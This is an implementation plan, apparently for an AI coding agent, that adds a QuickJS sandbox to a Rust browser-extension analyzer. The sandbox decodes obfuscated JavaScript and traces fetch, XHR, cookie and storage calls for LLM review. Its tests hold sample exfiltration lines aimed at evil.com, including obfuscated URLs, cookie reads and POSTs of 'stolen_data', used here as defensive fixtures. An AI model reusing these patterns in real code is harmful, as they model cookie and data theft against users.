# Sandboxed Deobfuscation Tool - Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Add an LLM-invokable tool that executes JavaScript snippets in a QuickJS sandbox to decode obfuscated code and trace API calls.

**Architecture:** New `sandbox` module with QuickJS runtime (via `rquickjs` crate), JavaScript mocks injected before user code, and structured trace output. LLM agents get a `deobfuscate` tool they can call when analyzing suspicious code.

**Tech Stack:** rquickjs (QuickJS bindings), serde_json (trace serialization), existing rig-core LLM integration.

---

## Task 1: Add rquickjs Dependency

**Files:**
- Modify: `Cargo.toml`

**Step 1: Add the dependency**

Run:
```bash
cargo add rquickjs --features bindgen,parallel
```

**Step 2: Verify it compiles**

Run:
```bash
cargo check
```

Expected: Compiles successfully (may take a while first time for QuickJS build)

**Step 3: Commit**

```bash
git add Cargo.toml Cargo.lock
git commit -m "chore: add rquickjs dependency for JS sandbox"
```

---

## Task 2: Create Sandbox Types

**Files:**
- Create: `src/sandbox/mod.rs`
- Create: `src/sandbox/trace.rs`
- Modify: `src/lib.rs`

**Step 1: Write the test for types**

Create `src/sandbox/trace.rs`:

```rust
use serde::{Deserialize, Serialize};

/// Result from sandbox execution
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct SandboxResult {
    /// Strings that were decoded (atob, fromCharCode, etc.)
    pub decoded_strings: Vec<DecodedString>,
    /// API calls that were attempted (fetch, chrome.*, etc.)
    pub api_calls: Vec<ApiCall>,
    /// Final value of the last expression, if any
    pub final_value: Option<String>,
    /// Error message if execution failed
    pub error: Option<String>,
}

/// A decoded string from obfuscation functions
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DecodedString {
    /// Function that was called (atob, fromCharCode, etc.)
    pub function: String,
    /// The encoded input
    pub input: String,
    /// The decoded output
    pub output: String,
}

/// An API call that was traced
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ApiCall {
    /// Full function path (e.g., "chrome.cookies.getAll", "fetch")
    pub function: String,
    /// Arguments passed to the function
    pub arguments: Vec<serde_json::Value>,
}

impl SandboxResult {
    pub fn with_error(error: impl Into<String>) -> Self {
        Self {
            error: Some(error.into()),
            ..Default::default()
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_sandbox_result_default() {
        let result = SandboxResult::default();
        assert!(result.decoded_strings.is_empty());
        assert!(result.api_calls.is_empty());
        assert!(result.final_value.is_none());
        assert!(result.error.is_none());
    }

    #[test]
    fn test_sandbox_result_with_error() {
        let result = SandboxResult::with_error("test error");
        assert_eq!(result.error, Some("test error".to_string()));
    }

    #[test]
    fn test_sandbox_result_serialization() {
        let result = SandboxResult {
            decoded_strings: vec![DecodedString {
                function: "atob".to_string(),
                input: "aGVsbG8=".to_string(),
                output: "hello".to_string(),
            }],
            api_calls: vec![ApiCall {
                function: "fetch".to_string(),
                arguments: vec![serde_json::json!("https://example.com")],
            }],
            final_value: Some("result".to_string()),
            error: None,
        };

        let json = serde_json::to_string(&result).unwrap();
        let parsed: SandboxResult = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed.decoded_strings.len(), 1);
        assert_eq!(parsed.api_calls.len(), 1);
    }
}
```

**Step 2: Create the module file**

Create `src/sandbox/mod.rs`:

```rust
mod trace;

pub use trace::{ApiCall, DecodedString, SandboxResult};

/// Execute a JavaScript snippet in the sandbox
///
/// Returns decoded strings, traced API calls, and the final expression value.
/// Execution is isolated - no network or filesystem access is possible.
pub fn execute_snippet(code: &str, timeout_ms: u64) -> SandboxResult {
    // TODO: Implement in next task
    let _ = (code, timeout_ms);
    SandboxResult::with_error("Not yet implemented")
}
```

**Step 3: Register the module**

Modify `src/lib.rs` - add after line 6:

```rust
pub mod sandbox;
```

**Step 4: Run tests**

Run:
```bash
cargo test sandbox --lib
```

Expected: 3 tests pass

**Step 5: Commit**

```bash
git add src/sandbox/ src/lib.rs
git commit -m "feat(sandbox): add sandbox types and module structure"
```

---

## Task 3: Create JavaScript Mocks

**Files:**
- Create: `src/sandbox/mocks.rs`

**Step 1: Create the mocks module**

Create `src/sandbox/mocks.rs`:

```rust
/// JavaScript code injected before user code to mock browser APIs and trace calls
pub const SANDBOX_PRELUDE: &str = r#"
// Trace storage - will be serialized back to Rust
var __trace = {
    decoded: [],
    calls: []
};

// Helper to record decoded strings
function __recordDecode(fn, input, output) {
    __trace.decoded.push({ function: fn, input: String(input), output: String(output) });
    return output;
}

// Helper to record API calls
function __recordCall(fn, args) {
    __trace.calls.push({ function: fn, arguments: Array.from(args) });
}

// Mock atob (base64 decode) - QuickJS has this built-in
var __origAtob = typeof atob !== 'undefined' ? atob : function(s) {
    // Fallback base64 decode
    var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
    var output = '';
    var buffer;
    s = s.replace(/=+$/, '');
    for (var i = 0, len = s.length; i < len; ) {
        buffer = (chars.indexOf(s[i++]) << 18) | (chars.indexOf(s[i++]) << 12) |
                 (chars.indexOf(s[i++]) << 6) | chars.indexOf(s[i++]);
        output += String.fromCharCode((buffer >> 16) & 0xff);
        if (s[i - 2] !== '=') output += String.fromCharCode((buffer >> 8) & 0xff);
        if (s[i - 1] !== '=') output += String.fromCharCode(buffer & 0xff);
    }
    return output;
};

globalThis.atob = function(s) {
    var result = __origAtob(s);
    return __recordDecode('atob', s, result);
};

// Mock btoa (base64 encode)
var __origBtoa = typeof btoa !== 'undefined' ? btoa : function(s) {
    var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
    var output = '';
    for (var i = 0, len = s.length; i < len; ) {
        var a = s.charCodeAt(i++);
        var b = i < len ? s.charCodeAt(i++) : 0;
        var c = i < len ? s.charCodeAt(i++) : 0;
        output += chars[(a >> 2)] + chars[((a & 3) << 4) | (b >> 4)] +
                  chars[((b & 15) << 2) | (c >> 6)] + chars[c & 63];
    }
    var pad = s.length % 3;
    if (pad) output = output.slice(0, pad - 3) + '==='.slice(pad);
    return output;
};

globalThis.btoa = function(s) {
    var result = __origBtoa(s);
    return __recordDecode('btoa', s, result);
};

// Wrap String.fromCharCode to trace it
var __origFromCharCode = String.fromCharCode;
String.fromCharCode = function() {
    var result = __origFromCharCode.apply(String, arguments);
    var input = Array.prototype.slice.call(arguments).join(',');
    return __recordDecode('String.fromCharCode', input, result);
};

// Mock fetch
globalThis.fetch = function(url, options) {
    __recordCall('fetch', [url, options || {}]);
    return Promise.resolve({ ok: false, status: 0, text: function() { return Promise.resolve(''); } });
};

// Mock XMLHttpRequest
globalThis.XMLHttpRequest = function() {
    this._method = '';
    this._url = '';
};
XMLHttpRequest.prototype.open = function(method, url) {
    this._method = method;
    this._url = url;
    __recordCall('XMLHttpRequest.open', [method, url]);
};
XMLHttpRequest.prototype.send = function(body) {
    __recordCall('XMLHttpRequest.send', [this._method, this._url, body || null]);
};
XMLHttpRequest.prototype.setRequestHeader = function() {};

// Proxy-based mock for chrome.* and browser.* APIs
function createTracingProxy(basePath) {
    return new Proxy({}, {
        get: function(target, prop) {
            var path = basePath + '.' + prop;
            return new Proxy(function() {
                __recordCall(path, Array.from(arguments));
                return undefined;
            }, {
                get: function(target, innerProp) {
                    return createTracingProxy(path)[innerProp];
                }
            });
        }
    });
}

globalThis.chrome = createTracingProxy('chrome');
globalThis.browser = createTracingProxy('browser');

// Mock document.cookie
var __fakeCookie = '';
globalThis.document = globalThis.document || {};
Object.defineProperty(globalThis.document, 'cookie', {
    get: function() {
        __recordCall('document.cookie.get', []);
        return __fakeCookie;
    },
    set: function(val) {
        __recordCall('document.cookie.set', [val]);
        __fakeCookie = val;
    }
});

// Mock localStorage/sessionStorage
function createStorageMock(name) {
    var storage = {};
    return {
        getItem: function(key) {
            __recordCall(name + '.getItem', [key]);
            return storage[key] || null;
        },
        setItem: function(key, val) {
            __recordCall(name + '.setItem', [key, val]);
            storage[key] = String(val);
        },
        removeItem: function(key) {
            __recordCall(name + '.removeItem', [key]);
            delete storage[key];
        },
        clear: function() {
            __recordCall(name + '.clear', []);
            storage = {};
        }
    };
}

globalThis.localStorage = createStorageMock('localStorage');
globalThis.sessionStorage = createStorageMock('sessionStorage');

// Mock console to prevent errors
globalThis.console = {
    log: function() {},
    warn: function() {},
    error: function() {},
    info: function() {},
    debug: function() {}
};

// Mock setTimeout/setInterval (don't actually schedule, just trace)
globalThis.setTimeout = function(fn, delay) {
    __recordCall('setTimeout', [typeof fn === 'string' ? fn : '[function]', delay]);
    return 0;
};
globalThis.setInterval = function(fn, delay) {
    __recordCall('setInterval', [typeof fn === 'string' ? fn : '[function]', delay]);
    return 0;
};

// Return trace at the end - this will be called by Rust
function __getTrace() {
    return JSON.stringify(__trace);
}
"#;

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_prelude_is_valid_js_syntax() {
        // Just check it's not empty and has expected markers
        assert!(SANDBOX_PRELUDE.contains("__trace"));
        assert!(SANDBOX_PRELUDE.contains("__getTrace"));
        assert!(SANDBOX_PRELUDE.contains("globalThis.fetch"));
        assert!(SANDBOX_PRELUDE.contains("globalThis.chrome"));
    }
}
```

**Step 2: Register mocks module**

Modify `src/sandbox/mod.rs` - add at top:

```rust
mod mocks;
mod trace;

pub use trace::{ApiCall, DecodedString, SandboxResult};
```

**Step 3: Run tests**

Run:
```bash
cargo test sandbox --lib
```

Expected: 4 tests pass

**Step 4: Commit**

```bash
git add src/sandbox/mocks.rs src/sandbox/mod.rs
git commit -m "feat(sandbox): add JavaScript mocks for API tracing"
```

---

## Task 4: Implement QuickJS Runtime

**Files:**
- Create: `src/sandbox/runtime.rs`
- Modify: `src/sandbox/mod.rs`

**Step 1: Create the runtime module**

Create `src/sandbox/runtime.rs`:

```rust
use rquickjs::{Context, Runtime, Function, Value};
use std::time::{Duration, Instant};

use super::mocks::SANDBOX_PRELUDE;
use super::trace::SandboxResult;

/// Execute JavaScript code in an isolated QuickJS runtime
pub fn run_in_sandbox(code: &str, timeout_ms: u64) -> SandboxResult {
    // Create runtime with memory limit
    let runtime = match Runtime::new() {
        Ok(rt) => rt,
        Err(e) => return SandboxResult::with_error(format!("Failed to create runtime: {}", e)),
    };

    // Set memory limit (16MB should be plenty for deobfuscation)
    runtime.set_memory_limit(16 * 1024 * 1024);

    // Create context
    let context = match Context::full(&runtime) {
        Ok(ctx) => ctx,
        Err(e) => return SandboxResult::with_error(format!("Failed to create context: {}", e)),
    };

    let start = Instant::now();
    let timeout = Duration::from_millis(timeout_ms);

    // Set up interrupt handler for timeout
    runtime.set_interrupt_handler(Some(Box::new(move || {
        start.elapsed() > timeout
    })));

    context.with(|ctx| {
        // Run the prelude to set up mocks
        if let Err(e) = ctx.eval::<(), _>(SANDBOX_PRELUDE) {
            return SandboxResult::with_error(format!("Prelude error: {}", e));
        }

        // Run the user code, capturing the final value
        let user_result: Result<Value, _> = ctx.eval(code);

        let final_value = match &user_result {
            Ok(val) => value_to_string(val),
            Err(_) => None,
        };

        // Get the trace
        let trace_result: Result<String, _> = ctx.eval("__getTrace()");

        let mut result = match trace_result {
            Ok(json) => parse_trace(&json),
            Err(e) => SandboxResult::with_error(format!("Failed to get trace: {}", e)),
        };

        // Set final value
        result.final_value = final_value;

        // Check if we had an error (but still return partial results)
        if let Err(e) = user_result {
            let error_msg = format!("{}", e);
            if error_msg.contains("interrupted") {
                result.error = Some(format!("Timeout after {}ms (possible infinite loop)", timeout_ms));
            } else if result.error.is_none() {
                result.error = Some(error_msg);
            }
        }

        result
    })
}

/// Convert a QuickJS Value to an optional String
fn value_to_string(val: &Value) -> Option<String> {
    if val.is_undefined() || val.is_null() {
        return None;
    }

    if let Some(s) = val.as_string() {
        return s.to_string().ok();
    }

    if let Some(n) = val.as_int() {
        return Some(n.to_string());
    }

    if let Some(n) = val.as_float() {
        return Some(n.to_string());
    }

    if let Some(b) = val.as_bool() {
        return Some(b.to_string());
    }

    // For objects/arrays, try to stringify
    None
}

/// Parse the JSON trace from JavaScript
fn parse_trace(json: &str) -> SandboxResult {
    #[derive(serde::Deserialize)]
    struct JsTrace {
        decoded: Vec<JsDecoded>,
        calls: Vec<JsCall>,
    }

    #[derive(serde::Deserialize)]
    struct JsDecoded {
        function: String,
        input: String,
        output: String,
    }

    #[derive(serde::Deserialize)]
    struct JsCall {
        function: String,
        arguments: Vec<serde_json::Value>,
    }

    match serde_json::from_str::<JsTrace>(json) {
        Ok(trace) => SandboxResult {
            decoded_strings: trace
                .decoded
                .into_iter()
                .map(|d| super::trace::DecodedString {
                    function: d.function,
                    input: d.input,
                    output: d.output,
                })
                .collect(),
            api_calls: trace
                .calls
                .into_iter()
                .map(|c| super::trace::ApiCall {
                    function: c.function,
                    arguments: c.arguments,
                })
                .collect(),
            final_value: None,
            error: None,
        },
        Err(e) => SandboxResult::with_error(format!("Failed to parse trace: {}", e)),
    }
}
```

**Step 2: Update mod.rs to use runtime**

Replace `src/sandbox/mod.rs` with:

```rust
mod mocks;
mod runtime;
mod trace;

pub use trace::{ApiCall, DecodedString, SandboxResult};

/// Execute a JavaScript snippet in the sandbox
///
/// Returns decoded strings, traced API calls, and the final expression value.
/// Execution is isolated - no network or filesystem access is possible.
///
/// # Arguments
/// * `code` - JavaScript code to execute
/// * `timeout_ms` - Maximum execution time in milliseconds
///
/// # Example
/// ```
/// use extanalyzer::sandbox::execute_snippet;
///
/// let result = execute_snippet("atob('aGVsbG8=')", 1000);
/// assert_eq!(result.decoded_strings[0].output, "hello");
/// ```
pub fn execute_snippet(code: &str, timeout_ms: u64) -> SandboxResult {
    runtime::run_in_sandbox(code, timeout_ms)
}
```

**Step 3: Run tests**

Run:
```bash
cargo test sandbox --lib
```

Expected: All tests pass

**Step 4: Commit**

```bash
git add src/sandbox/
git commit -m "feat(sandbox): implement QuickJS runtime with timeout support"
```

---

## Task 5: Add Integration Tests for Sandbox

**Files:**
- Create: `tests/sandbox_tests.rs`

**Step 1: Write integration tests**

Create `tests/sandbox_tests.rs`:

```rust
use extanalyzer::sandbox::execute_snippet;

#[test]
fn test_atob_decoding() {
    let result = execute_snippet("atob('aGVsbG8=')", 1000);
    assert!(result.error.is_none(), "Error: {:?}", result.error);
    assert_eq!(result.decoded_strings.len(), 1);
    assert_eq!(result.decoded_strings[0].function, "atob");
    assert_eq!(result.decoded_strings[0].input, "aGVsbG8=");
    assert_eq!(result.decoded_strings[0].output, "hello");
}

#[test]
fn test_btoa_encoding() {
    let result = execute_snippet("btoa('hello')", 1000);
    assert!(result.error.is_none(), "Error: {:?}", result.error);
    assert_eq!(result.decoded_strings.len(), 1);
    assert_eq!(result.decoded_strings[0].function, "btoa");
    assert_eq!(result.decoded_strings[0].output, "aGVsbG8=");
}

#[test]
fn test_fromcharcode_decoding() {
    let result = execute_snippet("String.fromCharCode(72, 101, 108, 108, 111)", 1000);
    assert!(result.error.is_none(), "Error: {:?}", result.error);
    assert_eq!(result.decoded_strings.len(), 1);
    assert_eq!(result.decoded_strings[0].function, "String.fromCharCode");
    assert_eq!(result.decoded_strings[0].output, "Hello");
    assert_eq!(result.final_value, Some("Hello".to_string()));
}

#[test]
fn test_fetch_tracing() {
    let result = execute_snippet(
        "fetch('https://evil.com/collect', { method: 'POST', body: 'data' })",
        1000,
    );
    assert!(result.error.is_none(), "Error: {:?}", result.error);
    assert_eq!(result.api_calls.len(), 1);
    assert_eq!(result.api_calls[0].function, "fetch");
    assert_eq!(result.api_calls[0].arguments[0], "https://evil.com/collect");
}

#[test]
fn test_xhr_tracing() {
    let code = r#"
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'https://evil.com/data');
        xhr.send('stolen_data');
    "#;
    let result = execute_snippet(code, 1000);
    assert!(result.error.is_none(), "Error: {:?}", result.error);
    assert!(result.api_calls.len() >= 2);
    assert!(result.api_calls.iter().any(|c| c.function == "XMLHttpRequest.open"));
    assert!(result.api_calls.iter().any(|c| c.function == "XMLHttpRequest.send"));
}

#[test]
fn test_chrome_api_tracing() {
    let code = "chrome.cookies.getAll({ domain: '.github.com' })";
    let result = execute_snippet(code, 1000);
    assert!(result.error.is_none(), "Error: {:?}", result.error);
    assert_eq!(result.api_calls.len(), 1);
    assert_eq!(result.api_calls[0].function, "chrome.cookies.getAll");
}

#[test]
fn test_document_cookie_tracing() {
    let code = "var c = document.cookie; document.cookie = 'stolen=true';";
    let result = execute_snippet(code, 1000);
    assert!(result.error.is_none(), "Error: {:?}", result.error);
    assert!(result.api_calls.iter().any(|c| c.function == "document.cookie.get"));
    assert!(result.api_calls.iter().any(|c| c.function == "document.cookie.set"));
}

#[test]
fn test_localstorage_tracing() {
    let code = r#"
        localStorage.setItem('key', 'value');
        localStorage.getItem('key');
    "#;
    let result = execute_snippet(code, 1000);
    assert!(result.error.is_none(), "Error: {:?}", result.error);
    assert!(result.api_calls.iter().any(|c| c.function == "localStorage.setItem"));
    assert!(result.api_calls.iter().any(|c| c.function == "localStorage.getItem"));
}

#[test]
fn test_combined_obfuscation() {
    // Simulates real obfuscation: base64 decode then use
    let code = r#"
        var url = atob('aHR0cHM6Ly9ldmlsLmNvbS9zdGVhbA==');
        fetch(url, { method: 'POST' });
    "#;
    let result = execute_snippet(code, 1000);
    assert!(result.error.is_none(), "Error: {:?}", result.error);

    // Should decode the URL
    assert_eq!(result.decoded_strings.len(), 1);
    assert_eq!(result.decoded_strings[0].output, "https://evil.com/steal");

    // Should trace the fetch with decoded URL
    assert_eq!(result.api_calls.len(), 1);
    assert_eq!(result.api_calls[0].arguments[0], "https://evil.com/steal");
}

#[test]
fn test_syntax_error_returns_error() {
    let result = execute_snippet("this is not { valid javascript", 1000);
    assert!(result.error.is_some());
    assert!(result.error.unwrap().contains("Syntax") || result.error.unwrap().contains("error"));
}

#[test]
fn test_timeout_returns_partial_results() {
    // Decode something, then infinite loop
    let code = r#"
        atob('dGVzdA==');
        while(true) {}
    "#;
    let result = execute_snippet(code, 100); // Short timeout

    // Should have partial results from before the loop
    assert!(result.decoded_strings.len() >= 1 || result.error.is_some());

    // Should indicate timeout
    if let Some(err) = &result.error {
        assert!(
            err.contains("Timeout") || err.contains("interrupt"),
            "Unexpected error: {}",
            err
        );
    }
}

#[test]
fn test_reference_error_captured() {
    let result = execute_snippet("unknownVariable", 1000);
    assert!(result.error.is_some());
}

#[test]
fn test_final_value_captured() {
    let result = execute_snippet("1 + 2 + 3", 1000);
    assert!(result.error.is_none());
    assert_eq!(result.final_value, Some("6".to_string()));
}

#[test]
fn test_string_final_value() {
    let result = execute_snippet("'hello' + ' world'", 1000);
    assert!(result.error.is_none());
    assert_eq!(result.final_value, Some("hello world".to_string()));
}
```

**Step 2: Run tests**

Run:
```bash
cargo test --test sandbox_tests
```

Expected: All tests pass (some may need adjustment based on QuickJS behavior)

**Step 3: Commit**

```bash
git add tests/sandbox_tests.rs
git commit -m "test(sandbox): add integration tests for JS sandbox"
```

---

## Task 6: Add Deobfuscate Task to LLM Agents

**Files:**
- Modify: `src/llm/agents.rs`

**Step 1: Add the new task variant**

Modify `src/llm/agents.rs` - update `AnalysisTask` enum (around line 9):

```rust
/// Different types of analysis tasks that can be performed by the LLM
#[derive(Debug, Clone)]
pub enum AnalysisTask {
    /// Review the manifest.json for security issues
    ManifestReview,
    /// Analyze JavaScript code for suspicious patterns
    ScriptAnalysis,
    /// Analyze discovered endpoints for security concerns
    EndpointAnalysis,
    /// Generate a final summary of all findings
    FinalSummary,
    /// Deobfuscate a JavaScript snippet using sandbox execution
    Deobfuscate(String),
}
```

**Step 2: Update task_to_category function**

Modify `task_to_category` function (around line 397):

```rust
/// Map analysis task to finding category
fn task_to_category(task: &AnalysisTask) -> Category {
    match task {
        AnalysisTask::ManifestReview => Category::Permission,
        AnalysisTask::ScriptAnalysis => Category::ApiUsage,
        AnalysisTask::EndpointAnalysis => Category::Network,
        AnalysisTask::FinalSummary => Category::ApiUsage,
        AnalysisTask::Deobfuscate(_) => Category::Obfuscation,
    }
}
```

**Step 3: Add deobfuscate handling to build_prompt**

Modify `build_prompt` function (around line 118) - add new match arm:

```rust
/// Build a focused prompt for each task type
fn build_prompt(
    task: &AnalysisTask,
    extension: &Extension,
    static_findings: &[Finding],
    endpoints: &[Endpoint],
) -> String {
    match task {
        AnalysisTask::ManifestReview => build_manifest_prompt(extension),
        AnalysisTask::ScriptAnalysis => build_script_prompt(extension),
        AnalysisTask::EndpointAnalysis => build_endpoint_prompt(endpoints),
        AnalysisTask::FinalSummary => build_summary_prompt(extension, static_findings, endpoints),
        AnalysisTask::Deobfuscate(snippet) => build_deobfuscate_prompt(snippet),
    }
}
```

**Step 4: Add deobfuscate prompt builder**

Add new function after `build_summary_prompt` (around line 306):

```rust
/// Build prompt for deobfuscation analysis
fn build_deobfuscate_prompt(snippet: &str) -> String {
    // Actually run the sandbox here
    use crate::sandbox::execute_snippet;

    let result = execute_snippet(snippet, 2000);

    let decoded_text = if result.decoded_strings.is_empty() {
        "No strings were decoded.".to_string()
    } else {
        result
            .decoded_strings
            .iter()
            .map(|d| format!("- {}('{}') → '{}'", d.function, d.input, d.output))
            .collect::<Vec<_>>()
            .join("\n")
    };

    let calls_text = if result.api_calls.is_empty() {
        "No API calls were made.".to_string()
    } else {
        result
            .api_calls
            .iter()
            .map(|c| format!("- {}({})", c.function,
                c.arguments.iter().map(|a| a.to_string()).collect::<Vec<_>>().join(", ")))
            .collect::<Vec<_>>()
            .join("\n")
    };

    let error_text = result
        .error
        .map(|e| format!("\n\nExecution error: {}", e))
        .unwrap_or_default();

    format!(
        r#"I executed this JavaScript snippet in a sandbox:

```javascript
{}
```

Results:

**Decoded strings:**
{}

**API calls traced:**
{}

**Final value:** {}{}

Based on these results, explain what this code is trying to do. Is it malicious? What data does it access or exfiltrate?"#,
        snippet,
        decoded_text,
        calls_text,
        result.final_value.as_deref().unwrap_or("(none)"),
        error_text
    )
}
```

**Step 5: Run tests**

Run:
```bash
cargo test --lib
```

Expected: All tests pass

**Step 6: Commit**

```bash
git add src/llm/agents.rs
git commit -m "feat(llm): add Deobfuscate task with sandbox execution"
```

---

## Task 7: Add Deobfuscate to Script Analysis Prompt

**Files:**
- Modify: `src/llm/agents.rs`

**Step 1: Update script analysis prompt**

Update `build_script_prompt` function to mention the deobfuscation capability. Replace the format string (around line 193):

```rust
    format!(
        r#"You are a browser extension security analyst. Analyze these JavaScript files for suspicious patterns.

{}

Look for:
1. Dynamic code execution (eval, Function constructor, setTimeout with strings)
2. Obfuscation techniques (base64 encoded strings, character code manipulation)
3. Data exfiltration (sending browsing data, credentials, or personal info)
4. Credential theft attempts
5. DOM manipulation for phishing
6. Cryptocurrency mining code
7. Remote code loading

IMPORTANT: When you see obfuscated code like String.fromCharCode(...), atob(...), or hex-encoded strings,
you can ask to deobfuscate them by responding:
DEOBFUSCATE: <the exact code snippet>

For each finding, respond in this format:
FINDING: [SEVERITY] - [TITLE]
DESCRIPTION: [Brief description of what the code is doing and why it's concerning]

Severity levels: CRITICAL, HIGH, MEDIUM, LOW, INFO

If no security concerns are found, respond with "NO_FINDINGS"."#,
        scripts_text
    )
```

**Step 2: Handle DEOBFUSCATE requests in parse_findings**

Update `parse_findings` function to detect deobfuscation requests:

```rust
/// Parse LLM response to extract findings
fn parse_findings(response: &str, task: &AnalysisTask) -> Vec<Finding> {
    let mut findings = Vec::new();

    if response.contains("NO_FINDINGS") {
        return findings;
    }

    // Check for deobfuscation requests
    for line in response.lines() {
        let line = line.trim();
        if line.starts_with("DEOBFUSCATE:") {
            let snippet = line.strip_prefix("DEOBFUSCATE:").unwrap_or("").trim();
            if !snippet.is_empty() {
                // Run sandbox and add result as a finding
                use crate::sandbox::execute_snippet;
                let result = execute_snippet(snippet, 2000);

                let description = if !result.decoded_strings.is_empty() {
                    let decoded: Vec<String> = result
                        .decoded_strings
                        .iter()
                        .map(|d| format!("'{}' → '{}'", d.input, d.output))
                        .collect();
                    format!("Deobfuscated: {}", decoded.join(", "))
                } else if !result.api_calls.is_empty() {
                    let calls: Vec<String> = result
                        .api_calls
                        .iter()
                        .map(|c| c.function.clone())
                        .collect();
                    format!("API calls traced: {}", calls.join(", "))
                } else {
                    "No decodable content found".to_string()
                };

                findings.push(
                    Finding::new(
                        Severity::Info,
                        Category::Obfuscation,
                        "Deobfuscation result",
                    )
                    .with_description(description)
                    .with_snippet(snippet.to_string()),
                );
            }
        }
    }

    // Parse FINDING: [SEVERITY] - [TITLE] format (existing code)
    let lines: Vec<&str> = response.lines().collect();
    let mut i = 0;

    while i < lines.len() {
        let line = lines[i].trim();

        if line.starts_with("FINDING:") {
            // ... rest of existing parsing logic unchanged
```

**Step 3: Run tests**

Run:
```bash
cargo test --lib
```

Expected: All tests pass

**Step 4: Commit**

```bash
git add src/llm/agents.rs
git commit -m "feat(llm): enable LLM to request deobfuscation during analysis"
```

---

## Task 8: Final Integration Test

**Files:**
- Create: `tests/llm_sandbox_integration_test.rs`

**Step 1: Write integration test**

Create `tests/llm_sandbox_integration_test.rs`:

```rust
//! Integration test for sandbox + LLM deobfuscation flow

use extanalyzer::sandbox::execute_snippet;

/// Test that the sandbox correctly handles real-world obfuscation patterns
#[test]
fn test_real_world_obfuscation_pattern() {
    // This pattern is common in malicious extensions:
    // Build a URL from char codes, then fetch it
    let code = r#"
        var chars = [104,116,116,112,115,58,47,47,101,118,105,108,46,99,111,109];
        var url = String.fromCharCode.apply(null, chars);
        fetch(url, {
            method: 'POST',
            body: JSON.stringify({ cookies: 'stolen' })
        });
    "#;

    let result = execute_snippet(code, 2000);

    // Should decode the URL
    assert!(!result.decoded_strings.is_empty(), "Should have decoded strings");
    let decoded_url = &result.decoded_strings[0].output;
    assert_eq!(decoded_url, "https://evil.com", "Should decode to evil URL");

    // Should trace the fetch
    assert!(!result.api_calls.is_empty(), "Should have API calls");
    let fetch_call = result.api_calls.iter().find(|c| c.function == "fetch");
    assert!(fetch_call.is_some(), "Should have fetch call");
}

/// Test nested obfuscation (base64 inside char codes)
#[test]
fn test_nested_obfuscation() {
    let code = r#"
        // First layer: fromCharCode builds "aHR0cHM6Ly9ldmlsLmNvbQ=="
        var b64 = String.fromCharCode(97,72,82,48,99,72,77,54,76,121,57,108,100,109,108,115,76,109,78,118,98,81,61,61);
        // Second layer: atob decodes the base64
        var url = atob(b64);
        fetch(url);
    "#;

    let result = execute_snippet(code, 2000);

    // Should have both decodings
    assert!(result.decoded_strings.len() >= 2, "Should have multiple decodings");

    // Should ultimately reveal the URL
    let atob_decode = result.decoded_strings.iter().find(|d| d.function == "atob");
    assert!(atob_decode.is_some(), "Should have atob decode");
    assert_eq!(atob_decode.unwrap().output, "https://evil.com");
}

/// Test that sandbox doesn't allow actual network access
#[test]
fn test_network_isolation() {
    // Try to make a real network request
    let code = r#"
        var result = 'not_called';
        fetch('https://httpbin.org/get')
            .then(r => r.json())
            .then(d => { result = 'called'; });
        result;
    "#;

    let result = execute_snippet(code, 1000);

    // Fetch should be traced, not executed
    assert!(!result.api_calls.is_empty(), "Should trace fetch");

    // The result should still be 'not_called' because fetch is mocked
    // (Note: depending on promise handling, this might be 'not_called' or undefined)
    // The important thing is it didn't actually make a network request
}

/// Test memory limit protection
#[test]
fn test_memory_limit() {
    // Try to allocate huge amount of memory
    let code = r#"
        var arr = [];
        for (var i = 0; i < 100000000; i++) {
            arr.push(new Array(10000));
        }
    "#;

    let result = execute_snippet(code, 5000);

    // Should fail with memory or timeout error, not crash
    assert!(result.error.is_some(), "Should have error for memory exhaustion");
}
```

**Step 2: Run integration tests**

Run:
```bash
cargo test --test llm_sandbox_integration_test
```

Expected: All tests pass

**Step 3: Run all tests**

Run:
```bash
cargo test
```

Expected: All tests pass

**Step 4: Commit**

```bash
git add tests/llm_sandbox_integration_test.rs
git commit -m "test: add integration tests for LLM + sandbox deobfuscation"
```

---

## Task 9: Update CLAUDE.md Documentation

**Files:**
- Modify: `CLAUDE.md`

**Step 1: Add sandbox documentation**

Add to CLAUDE.md after the Architecture section:

```markdown
### Sandbox Module (`src/sandbox/`)

The sandbox module provides isolated JavaScript execution for deobfuscation:

- `execute_snippet(code, timeout_ms)` - Run JS in QuickJS sandbox
- Returns `SandboxResult` with decoded strings, API call traces, final value
- Used by LLM agents to decode `String.fromCharCode`, `atob`, etc.
- Completely isolated: no network, no filesystem, memory limited
```

**Step 2: Commit**

```bash
git add CLAUDE.md
git commit -m "docs: add sandbox module documentation"
```

---

## Summary

After completing all tasks, you will have:

1. **New `sandbox` module** with QuickJS-WASM runtime
2. **API mocking** that traces fetch, chrome.*, XHR, cookies, storage
3. **Decoding capture** for atob, btoa, String.fromCharCode
4. **Timeout protection** against infinite loops
5. **LLM integration** - agents can request deobfuscation
6. **Comprehensive tests** - unit and integration

The LLM can now see obfuscated code and call the deobfuscate tool to reveal what it actually does, providing much deeper security analysis.
